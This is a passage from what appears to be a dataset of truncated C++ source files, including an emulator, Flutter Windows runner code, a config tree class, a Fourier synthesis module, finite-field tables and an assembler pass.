else\r\n                cout << \"a1!=a2\" << endl;\r\n            \r\n            break;\r\n        case 9:\r\n            cin >> num;\r\n            cout << num << endl;\r\n\r\n            break;\r\n     \r\n        case 0:\r\n\r\n            break;\r\n        default:\n            cout << \"invalid num.\" << endl;\n            break;\r\n        }\r\n    } while (choice != 0);\r\n  \r\n    retu",
    "//--------------------------------------------------//\n// Headers\n//--------------------------------------------------//\n#include <cmath>\n#include <cstdint>\n#include <cstdlib>\n#include <fstream>\n#include <iomanip>\n#include <iostream>\n#include <string>\n#include <vector>\n\n//--------------------------------------------------//\n// Definitions\n//--------------------------------------------------//\n#define __RHEA_VERSION__ \"0.1.0-alpha.9\"\n#define __RHEA_DEBUG__ 0\n\n//--------------------------------------------------//\n// Code\n//--------------------------------------------------//\nnamespace Rhea {\n    /**\n     * @brief Converts a value into its hexadecimal representation.\n     * @param value The value.\n     * @param digits The digits.\n     * @return The hexadecimal representation.\n     */\n    static std::string format_hex(const std::uint16_t value, const std::uint8_t digits = 4) {\n        std::stringstream converter;\n\n        converter << std::setfill('0') << std::setw(digits) << std::uppercase << std::hex << value;\n\n        return converter.str();\n    }\n\n    /**\n     * @brief Checks if a string is prefixed.\n     * @param string The string.\n     * @param prefix The prefix.\n     * @return Whether or not is the string prefixed.\n     */\n    static bool is_prefixed(const std::string string, const std::string prefix) {\n        return string.size() >= prefix.size() && 0 == string.compare(0, prefix.size(), prefix);\n    }\n\n    /**\n     * @brief Checks if a string is suffixed.\n     * @param string The string.\n     * @param suffix The suffix.\n     * @return Whether or not is the string suffixed.\n     */\n    static bool is_suffixed(const std::string string, const std::string suffix) {\n        return string.size() >= suffix.size() && 0 == string.compare(string.size() - suffix.size(), suffix.size(), suffix);\n    }\n\n    /**\n     * @brief Splits a string into tokens.\n     * @param string The string.\n     * @param delimiter The delimiter\n     * @return The tokens.\n     * @note Solution from https://stackoverflow.com/questions/14265581.\n     */\n    static std::vector<std::string> split(const std::string string, const std::string delimiter) {\n        std::size_t start = 0, end = 0, size = delimiter.size();\n        std::string token;\n        std::vector<std::string> tokens;\n\n        while((end = string.find(delimiter, start)) != std::string::npos) {\n            token = string.substr(start, end - start);\n            start = end + size;\n            tokens.push_back(token);\n        }\n\n        tokens.push_back(string.substr(start));\n\n        return tokens;\n    }\n\n    class Memory {\n        public:\n            /**\n             * @brief Constructor.\n             */\n            Memory() {\n                this->data = new std::uint8_t[0x10000]();\n            }\n\n            /**\n             * @brief Get a byte from a specific address.\n             * @param address The address of the byte.\n             * @return The byte\n             */\n            std::uint8_t get(const std::uint16_t address) const noexcept {\n                return this->data[address];\n            }\n\n            /**\n             * @brief Set a byte from a specific address to a specific value.\n             * @param address The address\n             * @param value The value.\n             * @return Self-reference.\n             */\n            Memory & set(const std::uint16_t address, const std::uint8_t value) noexcept {\n                this->data[address] = value;\n                return *this;\n            }\n\n            /**\n             * @brief Loads the contents of a binary file into the ROM.\n             * @param path The path to the file.\n             * @return If the operation was successful.\n             */\n            bool load(const std::string path) {\n                std::ifstream file = std::ifstream(path, std::ios::binary);\n\n                if(!file.is_open()) {\n                    std::cerr << \"\\tFile at \\\"\" << path << \"\\\" not found.\" << std::endl;\n                    return false;\n                }\n\n                if(!file.read(reinterpret_cast<char *> (&this->data[0x8000]), 0x8000)) {\n                    std::cerr << \"\\tFile at \\\"\" << path << \"\\\" can't be loaded.\" << std::endl;\n                    return false;\n                }\n\n                file.close();\n\n                return true;\n            }\n\n            /**\n             * @brief Saves the contents of the ROM into a binary file.\n             * @param path The path to the file.\n             * @return If the operation was successful.\n             */\n            bool save(const std::string path) const {\n                std::ofstream file = std::ofstream(path, std::ios::binary);\n\n                if(!file.is_open()) {\n                    std::cerr << \"\\tFile at \\\"\" << path << \"\\\" not found.\" << std::endl;\n                    return false;\n                }\n\n                if(!file.write(reinterpret_cast<char *> (&this->data[0x8000]), 0x8000)) {\n                    std::cerr << \"\\tFile at \\\"\" << path << \"\\\" c",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"cullvox/noodle.h\"\n\nnamespace cullvox {\n\nnoodle::noodle(std::string name, noodle_variant value)\n    : _name(name)\n    , _type((noodle_type)value.index())\n    , _value(value)\n    , _is_array(false)\n    , _array()\n    , _children()\n{\n}\n\nnoodle::noodle(std::string name, noodle_array value)\n    : _name(name)\n    , _type((noodle_type)value.index())\n    , _value()\n    , _is_array(true)\n    , _array(value)\n    , _children()\n{\n}\n\nnoodle& noodle::operator=(const noodle& rhs) \n{\n    _name = rhs._name;\n    _type = rhs._type;\n    _value = rhs._value;\n    _is_array = rhs._is_array;\n    _array = rhs._array;\n    _children = rhs._children;\n\n    return *this;\n}\n\nnoodle& noodle::operator=(noodle_variant rhs)\n{\n    _type = (noodle_type)rhs.index();\n    _value = rhs;\n    _is_array = false;\n    _array = {};\n    _children = {};\n\n    return *this;\n}\n\nnoodle& noodle::operator=(noodle_array rhs)\n{\n    _type = (noodle_type)rhs.index();\n    _value = {};\n    _is_array = false;\n    _array = rhs;\n    _children = {};\n\n    return *this;\n}\n\nnoodle& noodle::operator[](const std::string& key)\n{\n    return _children[key];\n}\n\nvoid noodle::set_name(std::string name)\n{\n    _name = name;\n}\n\nstd::string noodle::name() const\n{\n    return _name;\n}\n\nnoodle_type noodle::type() const\n{\n    return _type;\n}\n\nsize_t noodle::size() const\n{\n    if (is_array())      return std::visit([](auto&& arg){return arg.size();}, _array);\n    else if (is_group()) return _children.size();\n    else                 return 0;\n}\n\nbool noodle::is_integer() const { return _type == noodle_type::integer; }\nbool noodle::is_boolean() const { return _type == noodle_type::boolean; }\nbool noodle::is_string() const { return _type == noodle_type::string; }\nbool noodle::is_float() const { return _type == noodle_type::floating; }\nbool noodle::is_array() const { return _is_array; }\nbool noodle::is_group() const { return _type == noodle_type::group; }\n\nstd::string noodle::to_string() const\n{\n    return \"IMPLEMENT ME!\";\n}\n\nstd::string noodle::dump() const\n{\n    std::stringstream ss;\n    recursive_dump(ss);\n    return ss.str();\n}\n\nvoid noodle::dump_value(std::stringstream& ss) const\n{\n    switch (_type) {\n    case noodle_type::integer:\n    case noodle_type::floating:\n    case noodle_type::boolean:\n    case noodle_type::string:\n        std::visit([&ss](auto&& arg){ ss << arg; }, _value);\n        break;\n    case noodle_type::group:\n        ss << \"{\";\n        for (const std::pair<std::string, noodle>& child : _children) {\n            child.second.recursive_dump(ss);\n        }\n        ss << \"}\";\n        break;\n    }\n}\n\nvoid noodle::dump_array(std::stringstream& ss) const\n{\n    switch (_type) {\n    case noodle_type::integer:\n    case noodle_type::floating:\n    case noodle_type::boolean:\n    case noodle_type::string:\n        std::visit([&ss](auto&& arg){ \n            for (const auto& value : arg) {\n                ss << value << \",\";\n            }\n        }, _array);\n        break;\n    case noodle_type::group:\n        // throw std::runtime_error(\"Arrays of groups do not exist.\");\n        break;\n    }\n}\n\nvoid noodle::recursive_dump(std::stringstream& ss) const\n{\n    ss << _name << \"=\";\n\n    if (_is_array) dump_array(ss);\n    else dump_value(ss);\n\n    ss << \",\";\n}\n\nenum class noodle_token \n{\n    unexpected,\n    identifier,\n    integer,\n    floating,\n    boolean,\n    string,\n    left_curly,\n    right_curly,\n    left_bracket,\n    right_bracket,\n    equal,\n    comma,\n    end,\n    newline,\n};\n\n}",
    "/*\n    FOURIER.CPP a module for Fourier Synthesis of signals\n    \n    Written in Microsoft Visual C++ by Paul de Leeuw.\n*/\n\n#include\t<conio.h>\n#include\t<string.h>\n#include\t<stdio.h>\n#include\t<windowsx.h>\n#include\t\"manp.h\"\n#include\t\"resource.h\"\n#include\t\"fractype.h\"\n#include\t\"colour.h\"\n#include\t\"Dib.h\"\n#include\t\"preview.h\"\n#include\t\"Plot.h\"\n\n#define\tPREVIEW_HEIGHT\t168\n#define\tPREVIEW_WIDTH\t180\n#define\tHOR_OFFSET\t145\n#define\tVERT_OFFSET\t142\n\n#define\tDEG2RAD\t\t57.29577951\n#define\tFOURIERMAX\t1000\n#define\tMAXSTEPS\t2500\n#define\tLEVELS\t\t30\t\t// number of harmonic sliders\n\n#define\tSQUARE\t\t'0'\n#define\tTRIANGLE\t'1'\n#define\tSAWTOOTH\t'2'\n#define\tFULLWAVE\t'3'\n#define\tSINEWAVE\t'4'\n#define\tCOSINEWAVE\t'5'\n#define\tIMPULSE\t\t'9'\n#define\tUSER\t\t'U'\n\nstruct\tfourierstruct\n    {    \n    double\tx;\t\t\t\t// starting point for harmonic\n    double\ty;\n    double\tmagsin;\t\t\t\t// magnitude of the sine component of the harmonic\n    double\tmagcos;\t\t\t\t// magnitude of the cosine component of the harmonic\n    WORD\tc;\t\t\t\t// colour of harmonic\n    }\tFourierArray[FOURIERMAX];   \n\nextern\tint\tuser_data(HWND);\n//extern\tchar\t*FractData(void);\nextern\tchar\t*GenerateMPEGFileName (char *, char *);\nextern\tchar\t*GenerateAnimFileName (char *, char *);\nextern\tvoid\tSetUpFilename(char *Filename, char *Folder, char *AnimType);\n\nextern\tlong\tthreshold;\nextern\tint\tsubtype;\t\t// see below\nextern\tWORD\ttype;\t\t\t// M=mand, J=Julia 1,2,4-> etc\nextern\tint\trow, col;\nextern\tPAINTSTRUCT \tps;\nextern\tHDC\thdcMem;\t\t\t// load picture into memory\nextern\tdouble \t*wpixels;\t\t// an array of doubles holding slope modified iteration counts\nextern\tRECT \tr;\nextern\tHWND\tPixelHwnd;\t\t// pointer to handle for pixel updating\nextern\tPOINT\tptSize;\t\t\t// Stores DIB dimensions\nextern\tBYTE\tcycleflag;\t\t// do colour cycling\nextern\tint\txdots, ydots, width, height, bits_per_pixel;;\n\nextern\tchar\tPNGName[];\t\t// base name for PNG file sequence\nextern\tchar\tScriptFileName[];\t// base name for script file \nextern\tchar\tMPGPath[];\t\t// path for MPEG files\nextern\tchar\tMPGFile[];\t\t// MPEG file\nextern\tchar\tANIMPNGPath[];\t\t// path for animated PNG files and LST files\nextern\tchar\tPNGFile[];\t\t// PNG file\n\nextern\tBOOL\tStartImmediately;\t// immediate start of animation generation\nextern\tBOOL\tDisplayAnimation;\t// allow system to know that we are currently displaying an animation\n\nextern\tint\ttime_to_break;\t\t// time to break out of animation?\nextern\tint\ttime_to_quit;\t\t// time to quit?\nextern\tBOOL\tAutoSaveFlag;\n\nextern\tBOOL\tWritePNGFrames;\t\t// write frames to PNG files\nextern\tBOOL\tWriteMemFrames;\t\t// write frames to memory\nextern\tBOOL\tWritePNGList;\t\t// write PNG filenames to a *lst file\nextern\tBOOL\tWriteMPEGFrames;\t// write frames directly to an MPEG file\n\n\tWORD\tNumHarmonics = 60, steps = 400, delay = 20;\nstatic\tdouble\tMagX, MagY;\t\t// magnitude of the fundamental expressed in screen size\n\nint\tWaveformArray[MAXSTEPS];   \n\nWORD\tWavePtr = 0;\t\t\t// point to the currently updated location\nstatic\tshort\tlevel[LEVELS];\nBOOL\t\tMovingWave = TRUE;\nstatic\tBOOL\tfirst = TRUE;\n\nextern\tint\tFibDelay(HWND, WORD);\nextern\tvoid\tConvertRGB2ASCII(BYTE, BYTE, BYTE, char *);\nextern\tchar\t*AnimData(void);\nextern\tCDib\tDib;\t\t\t// Device Independent Bitmaps\nextern\tCTrueCol    TrueCol;\t\t// palette info\nextern\tCPlot\tPlot;\t\t// image plotting routines \n\nstatic\tCPreview\tFourierPreview;\n\n/**************************************************************************\n\tWrite Slider values to string\n***************************************************************************/\n\nchar\t*WriteSliders(void)\n\n    {\n    static\tchar\tbuffer[LEVELS * 5 + 1];\t\t// 3 digits + sign + ',' per slider and a null at the end\n    int\ti;\n    char\tt[6];\n\n    *buffer = '\\0';\n    if (subtype == USER)\n\t{\n\tfor (i = 0; i < LEVELS; i++)\n\t    {\n\t    sprintf(t, \",%d\", level[i]);\n\t    strcat(buffer, t);;\n\t    }\n\t}\n    return buffer;\n    }\n\n/**************************************************************************\n\tWrite Slider values to string\n***************************************************************************/\n\nextern\tchar\t*strtok1(register char *, register const char *);\t// required to use different \n\t\t\t\t\t\t\t\t\t// static variable to main \n\t\t\t\t\t\t\t\t\t// strtok() in user.c\n\nint\tReadSliders(char *buffer)\n\n    {\n    char\tseps[]   = \",\";\n    char\t*token;\n    int\ti;\n\n    if (*buffer == '\\0' || subtype != USER)\t\t\t// nothing to do\n\treturn FALSE;\n    i = 0;\n    token = strtok1(buffer, seps);\n    while (i < LEVELS)\n\t{\n\tif (!token)\n\t    return TRUE;\n\tlevel[i++] = atoi(token);\n\ttoken = strtok1(NULL, seps);\n\t}\n    return TRUE;\n    }\n\n/**************************************************************************\n\tPlot Harmonics\n***************************************************************************/\n\nint\tHarmonics(BOOL clear, int TotalFrames, CPlot Plot)\n\n    {\n    WORD\ti, x1, y1, x2, y2, centrex, centrey;\n    double\txold, yold;\n    double\txnew, ynew;\n    int\ttest;\n\n    xnew = ynew = xold = yold = 0.0;\n    centrey = ydots / 2;\n    centrex = xdots / 4;\n\n    for (i = 0; i < NumHarmonics; ++i)\n\t{\n\tif (FourierArray[i].m",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.CreateAndShow(L\"modernlogintute\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/**********************************************************************\n * Copyright (c) 2018 Pieter Wuille, Greg Maxwell, Gleb Naumenko      *\n * Distributed under the MIT software license, see the accompanying   *\n * file LICENSE or http://www.opensource.org/licenses/mit-license.php.*\n **********************************************************************/\n\n/* This file was substantially auto-generated by doc/gen_params.sage. */\n#include \"../fielddefines.h\"\n\n#if defined(ENABLE_FIELD_BYTES_INT_7)\n\n#include \"generic_common_impl.h\"\n\n#include \"../lintrans.h\"\n#include \"../sketch_impl.h\"\n\n#endif\n\n#include \"../sketch.h\"\n\nnamespace {\n#ifdef ENABLE_FIELD_INT_49\n// 49 bit field\ntypedef RecLinTrans<uint64_t, 6, 6, 6, 6, 5, 5, 5, 5, 5> StatTable49;\ntypedef RecLinTrans<uint64_t, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 3, 3, 3> DynTable49;\nconstexpr StatTable49 SQR_TABLE_49({0x1, 0x4, 0x10, 0x40, 0x100, 0x400, 0x1000, 0x4000, 0x10000, 0x40000, 0x100000, 0x400000, 0x1000000, 0x4000000, 0x10000000, 0x40000000, 0x100000000, 0x400000000, 0x1000000000, 0x4000000000, 0x10000000000, 0x40000000000, 0x100000000000, 0x400000000000, 0x1000000000000, 0x402, 0x1008, 0x4020, 0x10080, 0x40200, 0x100800, 0x402000, 0x1008000, 0x4020000, 0x10080000, 0x40200000, 0x100800000, 0x402000000, 0x1008000000, 0x4020000000, 0x10080000000, 0x40200000000, 0x100800000000, 0x402000000000, 0x1008000000000, 0x20000000402, 0x80000001008, 0x200000004020, 0x800000010080});\nconstexpr StatTable49 QRT_TABLE_49({0, 0x10004196, 0x10004194, 0x5099461f080, 0x10004190, 0x40840600c20, 0x5099461f088, 0x58a56349cfde, 0x10004180, 0x48641a0c03fe, 0x40840600c00, 0x10084002848, 0x5099461f0c8, 0x4002048, 0x58a56349cf5e, 0x5088460a048, 0x10004080, 0x4c2852624dde, 0x48641a0c01fe, 0x14893129c280, 0x40840600800, 0x1eb23c323ace8, 0x10084002048, 0x48740a09417e, 0x5099461e0c8, 0x40852604d96, 0x4000048, 0x5cad2b29c37e, 0x58a563498f5e, 0x20000200, 0x50884602048, 0x10000000000, 0x10014080, 0x4c2a56624d96, 0x4c2852604dde, 0x1ee2347438ca0, 0x48641a0801fe, 0x480000000048, 0x14893121c280, 0x14091121c080, 0x40840700800, 0x1a5099561e17e, 0x1eb23c303ace8, 0x8740a894136, 0x10084402048, 0x18101c501ace8, 0x48740a89417e, 0x15dace6286f96, 0x5099561e0c8});\ntypedef Field<uint64_t, 49, 513, StatTable49, DynTable49, &SQR_TABLE_49, &QRT_TABLE_49> Field49;\n#endif\n\n#ifdef ENABLE_FIELD_INT_50\n// 50 bit field\ntypedef RecLinTrans<uint64_t, 6, 6, 6, 6, 6, 5, 5, 5, 5> StatTable50;\ntypedef RecLinTrans<uint64_t, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 3, 3> DynTable50;\nconstexpr StatTable50 SQR_TABLE_50({0x1, 0x4, 0x10, 0x40, 0x100, 0x400, 0x1000, 0x4000, 0x10000, 0x40000, 0x100000, 0x400000, 0x1000000, 0x4000000, 0x10000000, 0x40000000, 0x100000000, 0x400000000, 0x1000000000, 0x4000000000, 0x10000000000, 0x40000000000, 0x100000000000, 0x400000000000, 0x1000000000000, 0x1d, 0x74, 0x1d0, 0x740, 0x1d00, 0x7400, 0x1d000, 0x74000, 0x1d0000, 0x740000, 0x1d00000, 0x7400000, 0x1d000000, 0x74000000, 0x1d0000000, 0x740000000, 0x1d00000000, 0x7400000000, 0x1d000000000, 0x74000000000, 0x1d0000000000, 0x740000000000, 0x1d00000000000, 0x340000000001d, 0x1000000000053});\nconstexpr StatTable50 QRT_TABLE_50({0xfbdfa3ae9d4c, 0x38143245a4878, 0x38143245a487a, 0x38527487e7492, 0x38143245a487e, 0x3124c61f56d2a, 0x38527487e749a, 0xfa8c91b087c0, 0x38143245a486e, 0x3eca48c6196be, 0x3124c61f56d0a, 0x380000040080a, 0x38527487e74da, 0x976b2d8b39b4, 0xfa8c91b08740, 0xfa8cd5b02724, 0x38143245a496e, 0x316291dd013fe, 0x3eca48c6194be, 0x10344122064, 0x3124c61f5690a, 0x68c5f006ee40, 0x380000040000a, 0x852749fe64d0, 0x38527487e64da, 0x37ef8e9d0e9da, 0x976b2d8b19b4, 0x37fabd1cef34a, 0xfa8c91b0c740, 0x96282d9159b4, 0xfa8cd5b0a724, 0x464a8249dd0, 0x38143245b496e, 0x37eaa8ddc94be, 0x316291dd213fe, 0x392446035690a, 0x3eca48c6594be, 0x974b258b4964, 0x103441a2064, 0x385a7c87fb4da, 0x3124c61e5690a, 0xeb8ad5d9a724, 0x68c5f026ee40, 0x3724c61e5690a, 0x380000000000a, 0x3a8c5f026ee4a, 0x8527497e64d0, 0, 0x38527497e64da, 0x2fbdfa2ae8d0a});\ntypedef Field<uint64_t, 50, 29, StatTable50, DynTable50, &SQR_TABLE_50, &QRT_TABLE_50> Field50;\n#endif\n\n#ifdef ENABLE_FIELD_INT_51\n// 51 bit field\ntypedef RecLinTrans<uint64_t, 6, 6, 6, 6, 6, 6, 5, 5, 5> StatTable51;\ntypedef RecLinTrans<uint64_t, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 3> DynTable51;\nconstexpr StatTable51 SQR_TABLE_51({0x1, 0x4, 0x10, 0x40, 0x100, 0x400, 0x1000, 0x4000, 0x10000, 0x40000, 0x100000, 0x400000, 0x1000000, 0x4000000, 0x10000000, 0x40000000, 0x100000000, 0x400000000, 0x1000000000, 0x4000000000, 0x10000000000, 0x40000000000, 0x100000000000, 0x400000000000, 0x1000000000000, 0x4000000000000, 0x96, 0x258, 0x960, 0x2580, 0x9600, 0x25800, 0x96000, 0x258000, 0x960000, 0x2580000, 0x9600000, 0x25800000, 0x96000000, 0x258000000, 0x960000000, 0x2580000000, 0x9600000000, 0x25800000000, 0x96000000000, 0x258000000000, 0x960000000000, 0x2580000000000, 0x160000000004b, 0x580000000012c, 0x6000000000426});\nconstexpr StatTable51 QRT_TABLE_51({0x778bf2703d152, 0x2aaaafbff2092, 0x2aaaafbff2090, 0x4d2119c7e7780, 0x2aaaafbff2094, 0x",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"SecondPassAnalyzer.hpp\"\n\nSecondPassAnalyzer::SecondPassAnalyzer(std::unordered_map<std::string, uint16_t> &labels)\n    : labels(labels), elementSize(16) // 16 bits per element\n{\n    MEMdata = std::make_unique<std::fstream>(\"./MEMdata.txt\", std::ios::in | std::ios::out | std::ios::binary);\n    MEMtext = std::make_unique<std::fstream>(\"./MEMtext.txt\", std::ios::in | std::ios::out | std::ios::binary);\n\n    if (!MEMdata->is_open())\n    {\n        throw std::runtime_error(\"Failed to open MEMdata.txt\");\n    }\n    if (!MEMtext->is_open())\n    {\n        throw std::runtime_error(\"Failed to open MEMtext.txt\");\n    }\n}\n\nint SecondPassAnalyzer::analyse(std::ifstream &file)\n{\n    std::string line, instr, var;\n    std::string label;\n    u_int16_t address = 0;\n\n    while (getline(file, line))\n    {\n        std::istringstream iss(line);\n\n        if (!(iss >> instr))\n        {\n            continue; // Empty line or no instruction\n        }\n\n        parseInstruction(instr, iss, label, address);\n    }\n\n    for (auto const &[key, val] : labels)\n    {\n        if (usedLabels[key] == 0)\n        {\n            std::cerr << \"[Warning] \"\n                      << \"Label \" << key << \" is defined but not used.\\n\";\n        }\n    }\n\n    file.close();\n\n    return 0;\n}\n\nvoid SecondPassAnalyzer::parseInstruction(std::string &instr, std::istringstream &iss,\n                                          std::string &label, u_int16_t &address)\n{\n    if (instr.back() == ':')\n    {\n        label = instr.substr(0, instr.size() - 1);\n\n        if (!(iss >> instr))\n        {\n            return;\n        }\n    }\n\n    if (instr[0] == ';')\n    {\n        return; // Comment detected, stop processing the line\n    }\n\n    if (instr == \"CONST\")\n    {\n        std::string value;\n        iss >> value;\n\n        int16_t parsedValue = parseValue(value);\n\n        writeSignedConstantToMemory(labels[label], parsedValue); // Write to MEMdata\n        writeValueToFile(1, address++, 0x10);                    // Write NOP to MEMtext\n        return;\n    }\n    else if (instr == \"SPACE\")\n    {\n        writeValueToFile(0, labels[label], 0); // Write to MEMdata\n        writeValueToFile(1, address++, 0x10);  // Write NOP to MEMtext\n        return;\n    }\n    else if (instr == \"COPY\")\n    {\n        std::string src, dest;\n        iss >> src >> dest;\n\n        writeValueToFile(1, address++, getOpcode(instr)); // Write to MEMtext\n\n        if (labels.find(src) != labels.end())\n        {\n            usedLabels[src]++;\n            writeValueToFile(1, address++, labels[src]); // Write to MEMtext\n        }\n        else\n        {\n            std::cerr << \"Invalid source label \" << src << '\\n';\n            throw std::runtime_error(\"Invalid source label.\");\n        }\n        if (labels.find(dest) != labels.end())\n        {\n            usedLabels[dest]++;\n            